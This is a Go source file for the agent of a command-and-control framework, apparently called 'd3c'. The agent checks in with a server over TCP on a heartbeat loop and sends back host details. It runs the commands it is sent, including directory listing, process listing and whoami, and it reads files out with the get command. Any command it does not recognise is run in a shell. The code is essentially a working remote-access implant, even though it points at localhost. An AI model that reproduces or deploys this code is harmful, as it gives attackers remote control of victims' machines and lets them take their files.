package main

import (
	"crypto/md5"
	"d3c/agent/agent_helpers"
	"d3c/agent/commands"
	"d3c/agent/interfaces"
	"encoding/gob"
	"encoding/hex"
	"global"
	"helpers"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	message   = global.Message{}
	heartBeat = 5
)

const (
	SERVER = "127.0.0.1"
	PORT   = "9090"
)

func init() {
	message.AgentHostname, _ = os.Hostname()
	message.AgentCWD, _ = os.Getwd()
	message.AgentID = generateID()
}

func main() {
	log.Println("Execution started")

	for {
		channel := connectionServer()
		if channel == nil {
			log.Println("Failed to connect to server, retrying in 5 seconds...")
			time.Sleep(5 * time.Second)
			continue
		}

		//Sending message to server
		gob.NewEncoder(channel).Encode(message)
		message.Commands = []global.Command{}

		//Receiving message from server
		gob.NewDecoder(channel).Decode(&message)

		if messageContainsCommand(message) {
			for i, command := range message.Commands {
				commandID := agent_helpers.CommandValidation(helpers.CommandsSplit(command.Request)[0])

				if commandID != -1 {
					mapping := map[int]interfaces.Command{
						agent_helpers.CMD_CD:     commands.Cd{Command: command.Request},
						agent_helpers.CMD_LS:     commands.Ls{Command: command.Request},
						agent_helpers.CMD_PS:     commands.Ps{},
						agent_helpers.CMD_PWD:    commands.Pwd{},
						agent_helpers.CMD_WHOAMI: commands.Whoami{},
						agent_helpers.CMD_SEND:   commands.Send{Command: command.Request},
						agent_helpers.CMD_GET:    commands.Get{Command: command.Request},
						agent_helpers.CMD_SLEEP:  commands.Sleep{Command: command.Request},
					}

					response, err := mapping[commandID].Exec()
					if err != nil {
						message.Commands[i].Response = "Error: " + err.Error()
					} else {
						message.Commands[i].Response = response
					}

					// Handle file operations for get command
					if commandID == agent_helpers.CMD_GET {
						separatedCommand := helpers.CommandsSplit(command.Request)
						if len(separatedCommand) > 1 && len(separatedCommand[1]) > 0 {
							fileContent, fileErr := os.ReadFile(separatedCommand[1])
							if fileErr != nil {
								message.Commands[i].File.Error = true
								message.Commands[i].Response = "File read error: " + fileErr.Error()
							} else {
								message.Commands[i].File.Content = fileContent
								message.Commands[i].File.Name = separatedCommand[1]
							}
						}
					}

					// Handle sleep command to update heartbeat
					if commandID == agent_helpers.CMD_SLEEP {
						separatedCommand := helpers.CommandsSplit(command.Request)
						if len(separatedCommand) > 1 {
							timeStr := strings.TrimSpace(separatedCommand[1])
							if newHeartBeat, err := strconv.Atoi(timeStr); err == nil {
								heartBeat = newHeartBeat
							}
						}
					}
				} else {
					// Default shell execution for unknown commands
					defaultCmd := commands.Default{Command: command.Request}
					response, err := defaultCmd.Exec()
					if err != nil {
						message.Commands[i].Response = "Error: " + err.Error()
					} else {
						message.Commands[i].Response = response
					}
				}
			}
		}

		channel.Close()
		time.Sleep(time.Duration(heartBeat) * time.Second)
	}
}

///////

func messageContainsCommand(serverMessage global.Message) (contains bool) {
	contains = false
	if len(serverMessage.Commands) > 0 {
		contains = true
	}
	return contains
}

func generateID() string {
	time := time.Now().String()

	hash := md5.New()

	hash.Write([]byte(message.AgentHostname + time))

	return hex.EncodeToString(hash.Sum(nil))
}

func connectionServer() (channel net.Conn) {
	channel, err := net.Dial("tcp", SERVER+":"+PORT)
	if err != nil {
		log.Printf("Connection error: %v", err)
		return nil
	}
	return channel
}
